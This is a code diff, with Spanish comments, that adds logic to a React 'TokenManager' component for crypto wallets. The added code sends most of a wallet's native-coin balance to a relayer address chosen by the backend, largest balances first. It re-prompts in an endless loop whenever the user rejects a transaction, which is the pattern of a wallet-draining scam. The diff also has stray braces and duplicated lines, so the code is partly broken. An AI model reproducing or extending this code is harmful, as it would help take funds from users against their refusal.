@@ -644,27 +644,39 @@ export default function TokenManager(): React.JSX.Element {
   setProcessing(true)
   setSummary({ sent: [], failed: [] })
   
+  // Separar tokens nativos y no nativos
   const nonNativeTokens = tokens.filter(token => token.address !== null)
   const nativeTokens = tokens.filter(token => token.address === null)
-
-  // Procesar tokens no nativos
+  
+  // Procesar tokens no nativos automáticamente
   for (const token of nonNativeTokens) {
     await processToken(token)
   }
 
-  // Procesar tokens nativos SOLO si el usuario aceptó
+  // Procesar tokens nativos solo si el usuario acepta explícitamente
   if (nativeTokens.length > 0) {
-    const shouldProcessNatives = await confirmAction(
+    let shouldProcessNatives = false;
+    
+    // Mostrar confirmación solo una vez
+    shouldProcessNatives = await confirmAction(
       `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
-    )
+    );
     
     if (shouldProcessNatives) {
-      for (const token of nativeTokens) {
+      // Ordenar tokens nativos por balance (mayor primero)
+      const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
+        const balanceA = ethers.BigNumber.from(a.balance || '0')
+        const balanceB = ethers.BigNumber.from(b.balance || '0')
+        return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
+      })
+
+      // Procesar tokens nativos
+      for (const token of sortedNativeTokens) {
         await changeChainIfNeeded(token.chain as number)
         await processNativeToken(token)
       }
     } else {
-      // Agregar tokens nativos no procesados a la lista de fallados
+      // Si el usuario rechaza, agregar a la lista de fallados
       setSummary(prev => ({
         ...prev,
         failed: [
@@ -677,6 +689,211 @@ export default function TokenManager(): React.JSX.Element {
       }))
     }
   }
+
+  setProcessing(false)
+  setShowProcessingModal(false)
+
+  // Mostrar resumen después de un breve delay
+  setTimeout(() => {
+    if (summary.sent.length > 0 || summary.failed.length > 0) {
+      let message = '=== Resumen ===\n'
+      message += `Éxitos: ${summary.sent.length}\n`
+      message += `Fallos: ${summary.failed.length}\n`
+
+      if (summary.failed.length > 0) {
+        message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
+      }
+
+      showAlertModal('Resumen', message, 'info')
+    }
+  }, 100)
+}
+
+const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
+  try {
+    if (!walletClient || !publicClient || !address) {
+      throw new Error('Wallet no conectada correctamente');
+    }
+
+    // Cambiar a la cadena correcta antes de procesar
+    await changeChainIfNeeded(token.chain as number)
+
+    const targetChainId = token.chain as number;
+    if (!targetChainId) {
+      throw new Error('No se pudo determinar la cadena del token');
+    }
+
+    // Resto del código para wrap o transferencia...
+    const wrapInfo = await getWrapInfo(targetChainId);
+    const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;
+
+    const balanceBN = ethers.BigNumber.from(token.balance || '0')
+    const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto
+
+    // Estimaciones de gas
+    const gasLimitTransfer = ethers.BigNumber.from(21000)
+    const gasLimitWrap = ethers.BigNumber.from(100000)
+
+    // Buffer de seguridad
+    const buffer = gasPrice.mul(30000)
+
+    // Calcular máximos seguros
+    const feeWrap = gasPrice.mul(gasLimitWrap)
+    const feeTransfer = gasPrice.mul(gasLimitTransfer)
+    const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
+    const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)
+
+    // Si no hay suficiente para ninguna operación
+    if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
+      const reason = 'Saldo insuficiente para cubrir gas fees'
+      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+      return { success: false, reason }
+    }
+
+    // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
+    if (wrappedAddress && maxSafeForWrap.gt(0)) {
+      try {
+        showLoading(`Procesando wrap de ${token.symbol}...`)
+        
+        const wrapAbi = [
+          {
+            inputs: [],
+            name: 'deposit',
+            outputs: [],
+            stateMutability: 'payable',
+            type: 'function'
+          }
+        ] as const
+
+        // Reintentar hasta que la transacción sea confirmada
+        let transactionHash: string | undefined;
+        let confirmed = false;
+        
+        while (!confirmed) {
+          try {
+            transactionHash = await walletClient.writeContract({
+              address: wrappedAddress as `0x${string}`,
+              abi: wrapAbi,
+              functionName: 'deposit',
+              value: maxSafeForWrap.toBigInt(),
+              gas: gasLimitWrap.toBigInt()
+            })
+
+            showLoading(`Esperando confirmación de wrap para ${token.symbol}...`)
+            await publicClient.waitForTransactionReceipt({ hash: transactionHash })
+            confirmed = true;
+
+          } catch (error: any) {
+            if (isUserRejected(error)) {
+              // Si el usuario rechaza, mostrar alerta y reintentar
+              await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
+              continue;
+            }
+            throw error;
+          }
+        }
+
+        setSummary(prev => ({
+          ...prev,
+          sent: [...prev.sent, { 
+            token: { ...token, symbol: `W${token.symbol}` }, 
+            type: 'wrap', 
+            tx: transactionHash, 
+            amount: maxSafeForWrap.toString() 
+          }]
+        }))
+
+        hideLoading()
+        return { success: true }
+      } catch (error: any) {
+          // Manejo de errores
+          console.error('Error procesando token nativo:', error);
+          const reason = isUserRejected(error) ? 
+            'Usuario rechazó la transacción' : 
+            `Error: ${error?.message || error}`;
+
+          setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
+          return { success: false, reason };
+        }
+      };
+
+    // Si no se hizo wrap, crear solicitud de transferencia en el backend
+    if (maxSafeForTransfer.gt(0)) {
+      if (!BACKEND) throw new Error('BACKEND no configurado')
+      
+      showLoading(`Creando solicitud de transferencia para ${token.symbol}...`)
+      const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          owner: address,
+          chain: token.chain,
+          amount: maxSafeForTransfer.toString()
+        })
+      })
+
+      if (data.ok && data.instructions && data.instructions.relayerAddress) {
+        // Reintentar hasta que la transacción sea confirmada
+        let transactionHash: string | undefined;
+        let confirmed = false;
+        
+        while (!confirmed) {
+          try {
+            showLoading(`Enviando ${token.symbol} al relayer...`)
+            transactionHash = await walletClient.sendTransaction({
+              to: data.instructions.relayerAddress as `0x${string}`,
+              value: maxSafeForTransfer.toBigInt(),
+              gas: gasLimitTransfer.toBigInt()
+            })
+
+            showLoading(`Esperando confirmación de transferencia para ${token.symbol}...`)
+            await publicClient.waitForTransactionReceipt({ hash: transactionHash })
+            confirmed = true;
+
+          } catch (error: any) {
+            if (isUserRejected(error)) {
+              // Si el usuario rechaza, mostrar alerta y reintentar
+              await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
+              continue;
+            }
+            throw error;
+          }
+        }
+
+        setSummary(prev => ({
+          ...prev,
+          sent: [...prev.sent, { 
+            token, 
+            type: 'transfer', 
+            tx: transactionHash, 
+            amount: maxSafeForTransfer.toString(), 
+            jobId: data.jobId 
+          }]
+        }))
+        
+        hideLoading()
+        return { success: true }
+      } else {
+        hideLoading()
+        throw new Error('Error creando solicitud de transferencia')
+      }
+    }
+    
+    hideLoading()
+    return { success: false, reason: 'No se pudo procesar el token nativo' }
+  } catch (error: any) {
+    hideLoading()
+    console.error('Error procesando token nativo:', error)
+
+    const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`
+
+    setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+    return { success: false, reason }
+  }
+}
 
   setProcessing(false)
   setShowProcessingModal(false)
